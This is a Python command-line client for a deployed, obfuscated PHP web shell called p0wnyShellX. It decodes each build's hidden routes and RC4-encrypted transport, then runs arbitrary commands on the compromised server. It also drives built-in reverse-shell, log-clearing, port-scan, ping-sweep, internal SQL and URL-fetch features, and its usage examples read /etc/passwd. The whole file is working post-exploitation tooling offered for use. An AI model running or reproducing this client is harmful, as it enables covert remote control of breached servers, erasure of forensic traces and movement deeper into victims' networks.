#!/usr/bin/env python3
"""
shellx_client — non-interactive CLI client for a deployed p0wnyShellX shell.

Weevely-style automation companion: script it, pipe it, chain it.

The client learns the per-build protocol (routing tokens, parameter names,
transport encoding, crypto material) either from the generator sidecar
(--client-config file written at build time) or by parsing the generated
shell.php directly. Nothing here is static — that is the point of the
polymorphism — so do not hardcode tokens anywhere.

Usage:
  python3 shellx_client.py --url http://target/shell.php --shell ./shell.php \
      -u sysadmin -p 'MyPass!' -c "id"
  python3 shellx_client.py --url http://target/shell.php --config client.json \
      -u sysadmin -p 'MyPass!' -c "cat /etc/passwd"
  echo "whoami" | python3 shellx_client.py --url ... --shell ./shell.php -u .. -p ..   # stdin
  python3 shellx_client.py --url ... --shell ./shell.php -u .. -p ..                  # interactive

Exit codes: 0 success, 2 auth failure, 3 connection/protocol error.
"""
from __future__ import annotations

import argparse
import base64
import http.cookiejar
import json
import re
import sys
import urllib.parse
import urllib.request


# ─────────────────────────────────────────────────────────────────────────────
# Shell file parsing (coupled to the p0wnyShellX template — the runtime test
# suite exercises this against every transport, so template drift fails loudly)
# ─────────────────────────────────────────────────────────────────────────────

def _rc4(key: bytes, data: bytes) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(b ^ s[(s[i] + s[j]) % 256])
    return bytes(out)


def _b64_trans(data: str, src: str, dst: str) -> str:
    return data.translate(str.maketrans(src, dst))


_STD_ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'


class Protocol:
    """Everything needed to talk to one specific generated shell."""

    # Feature command -> (route key, [param keys in JS-interceptor order]).
    # Mirrors the browser interceptors in the generator template.
    FEATURE_ROUTES = ('revshell', 'clearlog', 'portscan', 'pingsweep', 'sql', 'fetch')

    def __init__(self, route_param, route_shell, p_cmd, p_cwd, transport='plain',
                 rc4_key_hex=None, b64_alpha=None, routes=None, params=None):
        self.route_param = route_param
        self.route_shell = route_shell
        self.p_cmd = p_cmd
        self.p_cwd = p_cwd
        self.transport = transport
        self.rc4_key = bytes.fromhex(rc4_key_hex) if rc4_key_hex else None
        self.b64_alpha = b64_alpha
        self.routes = routes or {}
        self.params = params or {}

    def param(self, key: str) -> str:
        """Full param map (sidecar) or the exec pair (parsed shell file)."""
        if self.params:
            return self.params[key]
        return {'p_cmd': self.p_cmd, 'p_cwd': self.p_cwd}[key]

    # -- value codecs ------------------------------------------------------
    def encode_value(self, value: str) -> str:
        if self.transport == 'mimic':
            return base64.b64encode(value.encode()).decode()
        if self.transport == 'rc4':
            raw = _rc4(self.rc4_key, value.encode())
            return _b64_trans(base64.b64encode(raw).decode(), _STD_ALPHA, self.b64_alpha)
        return value

    def decode_response(self, body: str) -> dict:
        if self.transport == 'mimic':
            body = base64.b64decode(body.strip()).decode()
        elif self.transport == 'rc4':
            raw = _b64_trans(body.strip(), self.b64_alpha, _STD_ALPHA)
            body = _rc4(self.rc4_key, base64.b64decode(raw)).decode()
        return json.loads(body)

    # -- constructors ------------------------------------------------------
    @classmethod
    def from_sidecar(cls, path: str) -> "Protocol":
        cfg = json.load(open(path, encoding='utf-8'))
        return cls(cfg['route_param'], cfg['routes']['shell'],
                   cfg['params']['p_cmd'], cfg['params']['p_cwd'],
                   transport=cfg.get('transport', 'plain'),
                   rc4_key_hex=cfg.get('rc4_key_hex'),
                   b64_alpha=cfg.get('b64_alpha'),
                   routes=cfg.get('routes'), params=cfg.get('params'))

    @classmethod
    def from_shell_file(cls, path: str) -> "Protocol":
        src = open(path, encoding='utf-8').read()

        m = re.search(r"isset\(\$_GET\['([a-z0-9]+)'\]\)", src)
        if not m:
            raise ValueError("route parameter not found — not a p0wnyShellX shell?")
        route_param = m.group(1)

        if '__trc4' in src:
            transport = 'rc4'
        elif re.search(r"base64_decode\(\$_POST\[", src):
            transport = 'mimic'
        else:
            transport = 'plain'

        # The shell case is the only one that opens by reading $cmd (every
        # other route starts with its own $__-prefixed or $path variables).
        m = re.search(r"case '([a-z0-9]+)':\s*\n\s*\$cmd = ", src)
        if not m:
            raise ValueError("shell route not found in the generated file")
        route_shell = m.group(1)
        block_start = m.start()

        # First two POST params after the case label are cmd and cwd.
        window = src[block_start:block_start + 3000]
        names = re.findall(r"\$_POST\['([a-zA-Z0-9_]+)'\]", window)
        if len(names) < 2:
            raise ValueError("could not extract cmd/cwd parameter names")
        p_cmd, p_cwd = names[0], names[1]

        rc4_key_hex = b64_alpha = None
        if transport == 'rc4':
            mk = re.search(r"hex2bin\('([0-9a-f]{32})'\)", src)
            ma = re.search(r"define\('__TA', '([^']+)'", src)
            if not (mk and ma):
                raise ValueError("rc4 key/alphabet not found in the generated file")
            rc4_key_hex, b64_alpha = mk.group(1), ma.group(1)

        return cls(route_param, route_shell, p_cmd, p_cwd,
                   transport=transport, rc4_key_hex=rc4_key_hex, b64_alpha=b64_alpha)


# ─────────────────────────────────────────────────────────────────────────────
# Client
# ─────────────────────────────────────────────────────────────────────────────

class ShellxClient:
    def __init__(self, url: str, proto: Protocol, timeout: int = 30):
        self.url = url
        self.proto = proto
        self.timeout = timeout
        self.cwd = None
        cj = http.cookiejar.CookieJar()
        self._opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(cj))

    def _post(self, fields: dict, route: str | None = None) -> bytes:
        url = self.url
        if route is not None:
            sep = '&' if '?' in url else '?'
            url = f"{url}{sep}{self.proto.route_param}={route}"
        data = urllib.parse.urlencode(fields).encode()
        req = urllib.request.Request(url, data=data, method='POST')
        with self._opener.open(req, timeout=self.timeout) as resp:
            return resp.read()

    def login(self, user: str, password: str) -> bool:
        body = self._post({'login': user, 'password': password}).decode('utf-8', 'replace')
        # A failed login re-renders the login form; success lands on the shell UI.
        return 'name="password"' not in body

    def _feature_call(self, command: str) -> str | None:
        """Intercept feature commands exactly like the browser JS does.

        Returns the decoded stdout, or None if the command is a plain shell
        command. Raises RuntimeError when the command targets a feature the
        protocol description cannot reach (parsed shell file, or the feature
        was not compiled into this build).
        """
        p = None
        if m := re.match(r'^\s*revshell\s+(\S+)\s+(\d+)(.*)?$', command, re.I):
            method = ''
            if mm := re.search(r'--method\s+(\S+)', m.group(3) or '', re.I):
                method = mm.group(1)
            p = ('revshell', {'p_ip': m.group(1), 'p_port_rs': m.group(2),
                              'p_rs_method': method})
        elif m := re.match(r'^\s*clearlog\s+(\S+)\s+(.+?)\s*$', command, re.I):
            p = ('clearlog', {'p_logfile': m.group(1), 'p_pattern': m.group(2)})
        elif m := re.match(r'^\s*portscan\s+(\S+)\s+(\S+)(.*)?$', command, re.I):
            rest = m.group(3) or ''
            mode = 'stealth' if re.search(r'--stealth', rest, re.I) else \
                   'fast' if re.search(r'--fast', rest, re.I) else 'default'
            tout = (re.search(r'--timeout\s+(\S+)', rest, re.I) or [None, ''])[1]
            pause = (re.search(r'--pause\s+(\S+)', rest, re.I) or [None, ''])[1]
            p = ('portscan', {'p_target': m.group(1), 'p_ports_ps': m.group(2),
                              'p_mode': mode, 'p_timeout': tout, 'p_pause': pause})
        elif m := re.match(r'^\s*pingsweep\s+(\S+)(.*)?$', command, re.I):
            rest = m.group(2) or ''
            mode = 'stealth' if re.search(r'--stealth', rest, re.I) else \
                   'fast' if re.search(r'--fast', rest, re.I) else 'default'
            tout = (re.search(r'--timeout\s+(\S+)', rest, re.I) or [None, ''])[1]
            pause = (re.search(r'--pause\s+(\S+)', rest, re.I) or [None, ''])[1]
            probe = (re.search(r'--ports\s+(\S+)', rest, re.I) or [None, ''])[1]
            p = ('pingsweep', {'p_target': m.group(1), 'p_ps_probe': probe,
                               'p_mode': mode, 'p_timeout': tout, 'p_pause': pause})
        elif m := re.match(r'^\s*sql\s+(\S+)\s+([\s\S]+?)\s*$', command, re.I):
            dsn, rest = m.group(1), m.group(2)
            dbu = dbp = ''
            if not dsn.lower().startswith('sqlite:'):
                cm = re.match(r'^(\S+)\s+(\S+)\s+([\s\S]+)$', rest)
                if cm:
                    dbu, dbp, rest = cm.group(1), cm.group(2), cm.group(3)
            q = re.sub(r"^(['\"])([\s\S]*)\1$", r'\2', rest)
            p = ('sql', {'p_dsn': dsn, 'p_dbuser': dbu, 'p_dbpass': dbp, 'p_sqlq': q})
        elif m := re.match(r'^\s*fetch\s+(\S+)\s*$', command, re.I):
            p = ('fetch', {'p_url': m.group(1)})
        if p is None:
            return None
        feature, fieldmap = p
        if feature not in self.proto.routes or not self.proto.params:
            raise RuntimeError(
                f"'{command.split()[0]}' needs the generator sidecar "
                f"(--client-config) and the feature compiled into the shell")
        fields = {self.proto.param(k): self.proto.encode_value(v)
                  for k, v in fieldmap.items()}
        resp = self.proto.decode_response(
            self._post(fields, route=self.proto.routes[feature]).decode('utf-8', 'replace'))
        return base64.b64decode(resp.get('stdout', '')).decode('utf-8', 'replace')

    def exec(self, command: str) -> str:
        feature_out = self._feature_call(command)
        if feature_out is not None:
            return feature_out
        fields = {
            self.proto.p_cmd: self.proto.encode_value(command),
            self.proto.p_cwd: self.proto.encode_value(self.cwd or ''),
        }
        resp = self.proto.decode_response(self._post(fields, route=self.proto.route_shell)
                                          .decode('utf-8', 'replace'))
        if 'stdout' not in resp:
            raise RuntimeError(f"unexpected response: {resp!r}")
        out = base64.b64decode(resp['stdout']).decode('utf-8', 'replace')
        if resp.get('cwd'):
            self.cwd = base64.b64decode(resp['cwd']).decode('utf-8', 'replace')
        return out


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description='Non-interactive CLI client for a p0wnyShellX shell.')
    ap.add_argument('--url', required=True, help='Deployed shell URL')
    ap.add_argument('--shell', help='Local copy of the generated shell.php (protocol is parsed from it)')
    ap.add_argument('--config', help='Generator sidecar JSON (written by --client-config)')
    ap.add_argument('-u', '--user', default='sysadmin')
    ap.add_argument('-p', '--password', required=True)
    ap.add_argument('-c', '--command', help='Command to run (omit for interactive, or pipe via stdin)')
    ap.add_argument('--timeout', type=int, default=30)
    args = ap.parse_args(argv)

    if not args.shell and not args.config:
        ap.error('one of --shell or --config is required')
    try:
        proto = (Protocol.from_sidecar(args.config) if args.config
                 else Protocol.from_shell_file(args.shell))
    except (ValueError, KeyError, FileNotFoundError, json.JSONDecodeError) as e:
        print(f"[!] protocol extraction failed: {e}", file=sys.stderr)
        return 3

    client = ShellxClient(args.url, proto, timeout=args.timeout)
    try:
        if not client.login(args.user, args.password):
            print("[!] authentication failed", file=sys.stderr)
            return 2

        def run(cmd):
            print(client.exec(cmd), end='')

        if args.command:
            run(args.command)
        elif not sys.stdin.isatty():
            for line in sys.stdin:
                if line.strip():
                    run(line.strip())
        else:
            print("[*] authenticated — interactive session (Ctrl-D to quit)", file=sys.stderr)
            while True:
                try:
                    run(input(f"{client.cwd or '?'}$ "))
                except EOFError:
                    break
    except (urllib.error.URLError, OSError, RuntimeError, json.JSONDecodeError) as e:
        print(f"[!] connection/protocol error: {e}", file=sys.stderr)
        return 3
    return 0


if __name__ == '__main__':
    sys.exit(main())
